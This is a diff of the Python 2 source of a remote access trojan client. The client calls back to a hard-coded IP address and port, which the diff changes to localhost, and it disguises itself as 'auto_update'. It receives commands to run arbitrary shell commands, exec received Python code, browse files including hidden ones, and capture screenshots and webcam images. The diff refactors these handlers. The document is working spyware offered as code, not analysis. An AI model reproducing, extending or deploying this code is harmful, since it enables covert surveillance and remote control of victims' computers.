@@ -18,8 +18,8 @@ import datetime
 import zlib
 import shutil
 
-HOST = '109.172.189.74'
-#HOST = '127.0.0.1'
+#HOST = '109.172.189.74'
+HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
 
@@ -79,6 +79,7 @@ while 1:
 
             # TODO: SOURCE START
             ID = ''
+            COMMANDS = {}
 
             destination_directory = 'iDocuments'
             client_name = 'auto_update'
@@ -133,8 +134,13 @@ while 1:
 
                 def __init__(self, data):
                     super(REACTOR, self).__init__()
+                    global COMMANDS
 
                     self.data = data
+                    self.active_thread = True
+
+                def stop(self):
+                    self.active_thread = False
 
                 def run(self):
 
@@ -156,12 +162,34 @@ while 1:
                         except:
                             output = 'dirOpenError'
 
+                    # List Directory
                     elif self.data['mode'] == 'explorerMode' and self.data['payload'] == 'getContent':
-                        output = ls()
+                        string = {
+                            'path': os.getcwdu()
+                        }
+                        try:
+                            for n, i in enumerate(os.listdir(u'.')):
+                                string[n] = {
+                                    'name': i,
+                                    'type': os.path.isfile(i),
+                                    'size': os.path.getsize(i),
+                                    'modified': time.ctime(os.path.getmtime(i)),
+                                    'hidden': has_hidden_attribute(i)
+                                }
+                            output = str(string)
+                        except WindowsError:
+                            output = 'windowsError'
 
                     # Execute Script
                     elif self.data['mode'] == 'scriptingMode':
-                        output = executeScript(self.data['payload'])
+                        mprint = ''
+                        try:
+                            exec self.data['payload']
+                            if mprint == '':
+                                return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
+                            output = str(mprint)
+                        except Exception as e:
+                            output = str(e)
 
                     # Get Desktop Preview
                     elif self.data['mode'] == 'getScreen':
@@ -171,17 +199,15 @@ while 1:
                     elif self.data['mode'] == 'getWebcam':
                         output = webcam_shot()
 
-                    # Get Processes List
-                    elif self.data['mode'] == 'processesMode':
-                        output = get_processes_list()
-
                     # Set Log Settings
                     elif self.data['mode'] == 'setLogSettings':
                         set_info(self.data['payload'])
 
-                    # Terminate Process
+                    # Window Destroyed
                     elif self.data['mode'] == 'terminateProcess':
-                        terminateProcess(self.data['payload'])
+                        if COMMANDS.has_key(self.data['payload']):
+                            COMMANDS[self.data['payload']].stop()
+                        return
 
                     # Shell Mode
                     elif self.data['mode'] == 'shellMode' and self.data['payload'].startswith('cd '):
@@ -194,14 +220,12 @@ while 1:
                     elif self.data['mode'] == 'shellMode':
                         execproc = subprocess.Popen(self.data['payload'], shell=True,
                                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        while True:
+                        while self.active_thread:
                             time.sleep(0.1)
                             line = execproc.stdout.readline()
                             if not line:
-                                print 'break'
                                 break
                             data_send(line, self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])
-                            print "SEND %s" % line
 
                         output = 'endCommandExecute'
 
@@ -662,24 +686,6 @@ while 1:
                 else:
                     return "Enter a command.\n"
 
-            # Get Content
-            def ls():
-                string = {
-                    'path': os.getcwdu()
-                }
-                try:
-                    for n, i in enumerate(os.listdir(u'.')):
-                        string[n] = {
-                            'name': i,
-                            'type': os.path.isfile(i),
-                            'size': os.path.getsize(i),
-                            'modified': time.ctime(os.path.getmtime(i)),
-                            'hidden': has_hidden_attribute(i)
-                        }
-                    return str(string)
-                except WindowsError:
-                    return 'windowsError'
-
             # Check Hidden Attribute
             def has_hidden_attribute(filepath):
                 try:
@@ -716,24 +722,6 @@ while 1:
                         CloseHandle(hProcess)
                 return str(PROCESSES)
 
-
-            # Terminate Process
-            def terminateProcess(PID):
-                hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, PID)
-                TerminateProcess(hProcess, 1)
-
-
-            def executeScript(source):
-                mprint = ''
-                try:
-                    exec source
-                    if mprint == '':
-                        return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
-                    return str(mprint)
-                except Exception as e:
-                    return str(e)
-
-
             def send_info():
                 global ACTIVE
                 while ACTIVE:
@@ -748,6 +736,7 @@ while 1:
             def reactor():
                 global ACTIVE
                 global ID
+                global COMMANDS
 
                 while 1:
 
@@ -766,13 +755,10 @@ while 1:
 
                     # After Initialized
                     while ACTIVE:
-                        commands = {}
-                        id = 0
                         data = data_receive()
                         if data:
-                            id += 1
-                            commands[id] = REACTOR(data)
-                            commands[id].start()
+                            COMMANDS[data['module_id']] = REACTOR(data)
+                            COMMANDS[data['module_id']].start()
                         else:
                             continue
 
